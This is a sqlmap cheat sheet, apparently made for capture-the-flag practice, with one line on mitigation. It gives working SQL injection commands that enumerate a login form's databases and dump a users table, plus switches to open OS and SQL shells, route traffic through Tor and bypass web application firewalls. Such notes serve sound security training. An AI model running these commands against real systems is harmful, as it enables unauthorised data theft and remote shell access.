# SQLMAP

## Commands
- ```sqlmap --help```
- ```sqlmap -u [target url]```
- ```sqlmap -u [target url] --os-shell```
- ```sqlmap -u [target url] --sql-shell```

## Example
- Login page
```
sqlmap -u https://admin-portal.htb/login.php --form --dbs
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass"
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" --dbs
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin --tables
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --columns
sqlmap -u https://admin-portal.htb/login.php --dbms=mysql --data "email=test@test.nz&password=pass" -D admin -T users --dump
```

## Advanced Switches
- Level
  - ```--dbs --level 5```
- Risk
  - ```--risk 3```
- POST 
  - ```sqlmap -u “http://testfire.net/login.jsp” --form --dbs``` 
- Technique
  - ```techniques=B --dbs```
  - ```B``` => Blind Boolean
  - ```T``` => Blind Time-based
  - ```E``` => Error-based
  - ```U``` => Union
- Tor
  - ```--tor```
- Shell
  - ```sqlmap -u “...” --sql-shell```
  - ```sqlmap -u “...” --os-shell```
- WAF Bypass 
  - Path: /usr/share/sqlmap/tamper 
  - ```--tamper=space2dash, hex2char --dbs```

## Mitigation
- Use parametrized statements, separate data from sql code
